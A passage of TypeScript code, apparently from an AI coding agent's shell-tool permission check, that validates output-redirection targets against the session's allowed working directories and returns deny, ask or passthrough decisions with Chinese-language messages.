              behavior: 'ask',
              message,
              blockedPath: resolvedPath,
              decisionReason,
              suggestions: [
                {
                  type: 'addDirectories',
                  directories: [getDirectoryForPath(resolvedPath)],
                  destination: 'session',
                },
              ],
            }
          }
        }
      }
    }
  }

  // 检查文件重定向
  if (statement.redirections) {
    for (const redir of statement.redirections) {
      if (redir.isMerging) continue
      if (!redir.target) continue
      if (isNullRedirectionTarget(redir.target)) continue

      const { allowed, resolvedPath, decisionReason } = validatePath(
        redir.target,
        cwd,
        toolPermissionContext,
        'create',
      )

      if (!allowed) {
        const workingDirs = Array.from(
          allWorkingDirectories(toolPermissionContext),
        )
        const dirListStr = formatDirectoryList(workingDirs)

        const message =
          decisionReason?.type === 'other' ||
          decisionReason?.type === 'safetyCheck'
            ? decisionReason.reason
            : `输出重定向到 '${resolvedPath}' 已被阻止。出于安全考虑，Limkenion 只能写入本会话允许的工作目录中的文件：${dirListStr}。`

        if (decisionReason?.type === 'rule') {
          return {
            behavior: 'deny',
            message,
            decisionReason,
          }
        }

        firstAsk ??= {
          behavior: 'ask',
          message,
          blockedPath: resolvedPath,
          decisionReason,
          suggestions: [
            {
              type: 'addDirectories',
              directories: [getDirectoryForPath(resolvedPath)],
              destination: 'session',
            },
          ],
        }
      }
    }
  }

  return (
    firstAsk ?? {
      behavior: 'passthrough',
      message: '所有路径约束均已成功校验',
    }
  )
}
